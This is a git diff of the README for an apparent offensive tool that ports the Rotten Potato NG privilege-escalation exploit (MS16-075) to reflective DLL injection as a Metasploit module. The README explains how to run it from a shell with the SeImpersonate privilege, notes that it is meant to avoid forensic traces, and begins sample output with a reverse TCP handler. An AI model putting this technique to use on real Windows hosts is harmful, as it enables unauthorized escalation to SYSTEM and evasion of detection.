@@ -1,5 +1,3 @@
-*This is a first draft and is subject to change by the end of the week. I'm aware of the bugs and plan on fixing them ASAP to make it more adaptable to certain situations.*
-
 # About
 
 A small project to port Rotten Potato NG for Reflection to avoid touching the disk and keep the entire attack in memory. Solves the problem of permissions issue and removes the need to leave forensic data. I prefer reflection of all things, which is why I chose to do this. Its a wonderful exploit to elevate from a service if you have the right privileges that is. And lukily, its unpatched :)
@@ -13,9 +11,8 @@ Grab the [Metasploit](ms16_075_reflection.rb) module, place it within the `~/.ms
 
 Once you've achieved a shell of some sort, and the user you are running / impersonate as has the SeImpersonate privilege, run the module with your chosen payload. 
 
-**Please Note: If you have an x86 session, but the computer is x64 , it will injection the x64 DLL. will fix ASAP. So as of now, just migrate to an x64 session so it cna inject the x64 DLL into x64 process. Havent quite figured this one out**
-
-```msf exploit(windows/local/ms16_075_reflection) > run
+```
+msf exploit(windows/local/ms16_075_reflection) > run
 
 [*] Started reverse TCP handler on -snip-:31334
 [*] Launching notepad to host the exploit...
